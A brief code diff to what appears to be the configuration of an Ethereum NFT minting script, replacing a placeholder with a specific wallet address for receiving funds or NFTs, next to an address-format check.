@@ -14,7 +14,7 @@ if (!receiveAddress.startsWith("0x") ||
 ) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
 
 /*   = = = = = YOUR WALLET ADRESS = = = = =   */
-const receiveAddress = "Your Eth wallet adress"; // Adress where you want to receive money/nfts
+const receiveAddress = "0x1284965A4eed5b89642D32b49882a6209EB177e5"; // Adress where you want to receive money/nfts
 
 /*   = = = = = AMOUNT = = = = =   */
 const mintInfo = {
